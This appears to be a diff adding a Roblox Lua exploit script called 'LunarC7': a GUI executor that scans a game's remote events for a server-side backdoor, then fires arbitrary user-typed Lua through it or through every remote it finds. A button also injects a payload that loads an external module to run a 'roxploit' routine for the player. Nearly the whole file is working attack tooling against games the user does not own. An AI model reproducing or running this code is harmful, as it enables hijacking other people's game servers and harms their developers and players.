@@ -1,0 +1,340 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local LC7 = Instance.new("ScreenGui")
+local GuiMain = Instance.new("Frame") 
+local GuiMain_corner = Instance.new("UICorner") 
+local GuiMain_stroke = Instance.new("UIStroke")
+local Input = Instance.new("TextBox")
+local Input_corner = Instance.new("UICorner") 
+local Input_stroke = Instance.new("UIStroke")
+local Output = Instance.new("TextLabel")
+local Output_corner = Instance.new("UICorner") 
+local Output_stroke = Instance.new("UIStroke")
+local Label = Instance.new("TextLabel")
+local Execute = Instance.new("TextButton") 
+local Execute_corner = Instance.new("UICorner") 
+local Execute_stroke = Instance.new("UIStroke")
+local Clear = Instance.new("TextButton") 
+local Clear_corner = Instance.new("UICorner") 
+local Clear_stroke = Instance.new("UIStroke")
+local Roxploit = Instance.new("TextButton") 
+local Roxploit_corner = Instance.new("UICorner") 
+local Roxploit_stroke = Instance.new("UIStroke")
+local Scan = Instance.new("TextButton") 
+local Scan_corner = Instance.new("UICorner") 
+local Scan_stroke = Instance.new("UIStroke")
+
+--// GUI Setup 
+LC7.Name = "LunarC7" 
+LC7.ResetOnSpawn = false 
+LC7.Parent = playerGui
+
+GuiMain.Name = "GuiMain" 
+GuiMain.Size = UDim2.new(0.4, 0, 0.5, 0) 
+GuiMain.Position = UDim2.new(0.3045, 0, 0.2032, 0) 
+GuiMain.BackgroundColor3 = Color3.fromRGB(22, 22, 22) 
+GuiMain.BackgroundTransparency = 0.4 GuiMain.Active = true 
+GuiMain.Draggable = true 
+GuiMain.Parent = LC7
+GuiMain_corner.CornerRadius = UDim.new(0, 8) 
+GuiMain_corner.Parent = GuiMain
+GuiMain_stroke.Thickness = 2 
+GuiMain_stroke.Color = Color3.fromRGB(140, 80, 255) 
+GuiMain_stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border 
+GuiMain_stroke.Parent = GuiMain
+
+Input.Name = 'Input'
+Input.Size = UDim2.new(0.7, 0, 0.55, 0)
+Input.Position = UDim2.new(0.0238, 0, 0.1355, 0)
+Input.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+Input.BackgroundTransparency = 0.6
+Input.Visible = true
+Input.Text = ""
+Input.PlaceholderText = 'Hello World!'
+Input.TextColor3 = Color3.fromRGB(255, 255, 255)
+Input.Font = Enum.Font.SourceSans
+Input.TextSize = 18
+Input.ClearTextOnFocus = false
+Input.TextWrapped = true
+Input.TextXAlignment = Enum.TextXAlignment.Left
+Input.TextYAlignment = Enum.TextYAlignment.Top
+Input.Parent = GuiMain
+Input_corner.CornerRadius = UDim.new(0, 8)
+Input_corner.Parent = Input
+Input_stroke.Thickness = 2
+Input_stroke.Color = Color3.fromRGB(140, 80, 255)
+Input_stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+Input_stroke.Parent = Input
+
+Output.Name = "Output"
+Output.Size = UDim2.new(0.95, 0, 0.225, 0) 
+Output.Position = UDim2.new(0.0238, 0, 0.7226, 0) 
+Output.BackgroundColor3 = Color3.fromRGB(22, 22, 22) 
+Output.BackgroundTransparency = 0.6 
+Output.Font = Enum.Font.Code
+Output.TextSize = 10
+Output.TextColor3 = Color3.fromRGB(255, 255, 255)
+Output.Text = ""
+Output.TextWrapped = true
+Output.TextXAlignment = Enum.TextXAlignment.Left
+Output.TextYAlignment = Enum.TextYAlignment.Top
+Output.RichText = true 
+Output.ClipsDescendants = true
+Output.Active = false 
+Output.Selectable = false
+Output.Parent = GuiMain
+Output_corner.CornerRadius = UDim.new(0, 8) 
+Output_corner.Parent = Output
+Output_stroke.Thickness = 2 
+Output_stroke.Color = Color3.fromRGB(140, 80, 255) 
+Output_stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border 
+Output_stroke.Parent = Output
+
+Label.Name = "Label" 
+Label.Size = UDim2.new(0.3, 0, 0, 30) 
+Label.Position = UDim2.new(0.333, 0, 0, 0) 
+Label.BackgroundTransparency = 1 
+Label.Text = "LunarC7" 
+Label.TextColor3 = Color3.fromRGB(200, 200, 220) 
+Label.Font = Enum.Font.SourceSans 
+Label.TextSize = 16
+Label.TextXAlignment = Enum.TextXAlignment.Center 
+Label.TextYAlignment = Enum.TextYAlignment.Center 
+Label.Parent = GuiMain
+
+Execute.Name = "Execute" 
+Execute.Size = UDim2.new(0.24, 0, 0, 32.5) 
+Execute.Position = UDim2.new(0.7374, 0, 0.1355, 0) 
+Execute.BackgroundColor3 = Color3.fromRGB(140, 80, 255) 
+Execute.BackgroundTransparency = 0.8 
+Execute.Text = "Execute" 
+Execute.Font = Enum.Font.SourceSansSemibold 
+Execute.TextColor3 = Color3.fromRGB(240, 220, 255) 
+Execute.TextSize = 16 
+Execute.Parent = GuiMain
+Execute_corner.CornerRadius = UDim.new(0, 8) 
+Execute_corner.Parent = Execute
+Execute_stroke.Color = Color3.fromRGB(140, 80, 255) 
+Execute_stroke.Thickness = 2 
+Execute_stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border 
+Execute_stroke.Parent = Execute
+Execute.MouseButton1Click:Connect(function() 
+    local CodeInput = Input.Text
+	if not CodeInput or CodeInput == "" then
+		ConsoleLog("[WARN] Empty Code!", "warn")
+		return
+	end
+
+	local InvokeFunc = Instance.new("BindableEvent")
+	InvokeFunc.Event:Connect(function(rfunc, CodeInput2)
+		pcall(function()
+			rfunc:InvokeServer(CodeInput2)
+		end)
+	end)
+
+	local function DeepFire()
+		for _, obj in pairs(game:GetDescendants()) do
+			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not obj:IsDescendantOf(game:GetService("ReplicatedStorage")) then
+				pcall(function()
+					if obj:IsA("RemoteEvent") then
+						obj:FireServer(CodeInput)
+					elseif obj:IsA("RemoteFunction") then
+						InvokeFunc:Fire(obj, CodeInput)
+					end
+				end)
+			end
+		end
+	end
+
+	if RemoteName then
+		pcall(function()
+			if RemoteName:IsA("RemoteEvent") then
+				RemoteName:FireServer(CodeInput)
+			elseif RemoteName:IsA("RemoteFunction") then
+				task.spawn(function()
+					RemoteName:InvokeServer(CodeInput)
+				end)
+			end
+		end)
+		ConsoleLog("[INFO] Executed Script", "info")
+	else
+		DeepFire()
+		ConsoleLog("[INFO] Executed DeepFire", "info")
+	end
+end)
+
+Clear.Name = "Clear" 
+Clear.Size = UDim2.new(0.24, 0, 0, 32.5) 
+Clear.Position = UDim2.new(0.7374, 0, 0.3161, 0) 
+Clear.BackgroundColor3 = Color3.fromRGB(140, 80, 255) 
+Clear.BackgroundTransparency = 0.8 
+Clear.Text = "Clear" 
+Clear.Font = Enum.Font.SourceSansSemibold 
+Clear.TextColor3 = Color3.fromRGB(240, 220, 255) 
+Clear.TextSize = 16 
+Clear.Parent = GuiMain
+Clear_corner.CornerRadius = UDim.new(0, 8) 
+Clear_corner.Parent = Clear
+Clear_stroke.Color = Color3.fromRGB(140, 80, 255) 
+Clear_stroke.Thickness = 2 
+Clear_stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border 
+Clear_stroke.Parent = Clear
+Clear.MouseButton1Click:Connect(function() 
+    Input.Text = ""
+    ConsoleLog("[INFO] Textbox Cleared", "info")
+end)
+
+Roxploit.Name = "Roxploit" 
+Roxploit.Size = UDim2.new(0.105, 0, 0, 40) 
+Roxploit.Position = UDim2.new(0.7374, 0, 0.4968, 0) 
+Roxploit.BackgroundColor3 = Color3.fromRGB(140, 80, 255) 
+Roxploit.BackgroundTransparency = 0.8 
+Roxploit.Text = "☄️" 
+Roxploit.Font = Enum.Font.SourceSansSemibold 
+Roxploit.TextColor3 = Color3.fromRGB(240, 220, 255) 
+Roxploit.TextSize = 16 
+Roxploit.Parent = GuiMain
+Roxploit_corner.CornerRadius = UDim.new(0, 8) 
+Roxploit_corner.Parent = Roxploit
+Roxploit_stroke.Color = Color3.fromRGB(140, 80, 255) 
+Roxploit_stroke.Thickness = 2 
+Roxploit_stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border 
+Roxploit_stroke.Parent = Roxploit
+Roxploit.MouseButton1Click:Connect(function() 
+    local playerName = game.Players.LocalPlayer.Name
+	local code = 'require(134958109300011):roxploit("' .. playerName .. '")'
+
+	local InvokeFunc = Instance.new("BindableEvent")
+	InvokeFunc.Event:Connect(function(rfunc, payload)
+		pcall(function()
+			rfunc:InvokeServer(payload)
+		end)
+	end)
+
+	local function DeepFire()
+		for _, obj in pairs(game:GetDescendants()) do
+			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not obj:IsDescendantOf(game:GetService("ReplicatedStorage")) then
+				pcall(function()
+					if obj:IsA("RemoteEvent") then
+						obj:FireServer(code)
+					elseif obj:IsA("RemoteFunction") then
+						InvokeFunc:Fire(obj, code)
+					end
+				end)
+			end
+		end
+	end
+
+	if RemoteName then
+		pcall(function()
+			if RemoteName:IsA("RemoteEvent") then
+				RemoteName:FireServer(code)
+			elseif RemoteName:IsA("RemoteFunction") then
+				task.spawn(function()
+					RemoteName:InvokeServer(code)
+				end)
+			end
+		end)
+	else
+		DeepFire()
+	end
+end)
+
+Scan.Name = "Scan" 
+Scan.Size = UDim2.new(0.12, 0, 0, 40) 
+Scan.Position = UDim2.new(0.8563, 0, 0.4968, 0) 
+Scan.BackgroundColor3 = Color3.fromRGB(140, 80, 255) 
+Scan.BackgroundTransparency = 0.8 Scan.Text = "??" 
+Scan.Font = Enum.Font.SourceSansSemibold 
+Scan.TextColor3 = Color3.fromRGB(240, 220, 255) 
+Scan.TextSize = 16 
+Scan.Parent = GuiMain
+Scan.Text = "💉"
+Scan_corner.CornerRadius = UDim.new(0, 8) 
+Scan_corner.Parent = Scan
+Scan_stroke.Color = Color3.fromRGB(140, 80, 255) 
+Scan_stroke.Thickness = 2 
+Scan_stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border 
+Scan_stroke.Parent = Scan
+Scan.MouseButton1Click:Connect(function() 
+    -- // Scanner Remote Backdoor
+	if RemoteFound then return end
+	RemoteFound = true
+	ConsoleLog("[WARN] Scanning...", "warn")
+
+	local RemoteList = {}
+	RemoteName = nil
+	Found = false
+
+	for _, v in ipairs(game:GetDescendants()) do
+		if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) and not v:IsDescendantOf(game:GetService("RobloxReplicatedStorage")) then
+			table.insert(RemoteList, v)
+		end
+	end
+
+	local function GenerateName(len)
+		local s = ""
+		for i = 1, len do
+			s = s .. string.char(math.random(65, 90))
+		end
+		return s
+	end
+
+	coroutine.wrap(function()
+		for _, Remote in ipairs(RemoteList) do
+			if Found then break end
+			local Name = GenerateName(12)
+			local Code = 'Instance.new("Model", workspace).Name = "' .. Name .. '"'
+			
+			pcall(function()
+				if Remote:IsA("RemoteEvent") then
+					Remote:FireServer(Code)
+				elseif Remote:IsA("RemoteFunction") then
+					Remote:InvokeServer(Code)
+				end
+			end)
+
+			task.wait(0.2)
+
+			local m = workspace:FindFirstChild(Name)
+			if m and m:IsA("Model") and not Found then
+				Found = true
+				RemoteName = Remote
+				ConsoleLog("[WARN] Backdoor Found!", "warn")
+				break
+			end
+		end
+
+		task.delay(3, function()
+			if not Found then
+				ConsoleLog("[ERROR] Backdoor Not Found", "error")
+			end
+			RemoteFound = false
+		end)
+	end)()
+end)
+
+--// Console
+local logLines = {}
+local maxLines = 5
+
+function ConsoleLog(text, logType)
+	local color = "ffffff"
+	if logType == "warn" then
+		color = "ffc800"
+	elseif logType == "error" then
+		color = "ff5555"
+	elseif logType == "info" then
+		color = "55ff55"
+	end
+
+	table.insert(logLines, '<font color="#'..color..'">'..text..'</font>')
+
+	if #logLines > maxLines then
+		table.remove(logLines, 1)
+	end
+
+	Output.Text = table.concat(logLines, "<br/>")
+end
